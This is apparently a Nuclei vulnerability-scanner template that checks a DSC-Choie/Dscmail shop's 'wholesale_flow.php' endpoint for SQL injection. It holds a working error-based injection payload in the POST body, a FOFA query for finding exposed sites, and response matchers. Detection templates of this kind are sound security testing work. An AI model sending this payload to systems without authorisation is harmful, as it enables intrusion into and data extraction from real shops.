id: dscmail-wholesale-flow-sqli

info:
  name: Dsmail wholesale_flow - SQL Injection
  author: qwtd
  severity: high
  description: |
    This template detects SQL Injection vulnerability on the DSC-Choie application via the `ajax_update_cart` endpoint.
  reference:
    - https://github.com/wy876/POC/blob/main/%E4%B8%8A%E6%B5%B7%E5%95%86%E5%88%9B/%E5%A4%A7%E5%95%86%E5%88%9B%E5%A4%9A%E7%94%A8%E6%88%B7%E5%95%86%E5%9F%8Ewholesale_flow.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa: body="dsc-choie"
  tags: Dscmail

http:
  - raw:
      - |
        POST /wholesale_flow.php?step=ajax_update_cart HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        rec_ids[]=extractvalue(1,concat(0x7e,version()))

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "XPATH syntax error"
          - "MySQL"
        condition: and
        
      - type: status
        status:
          - 200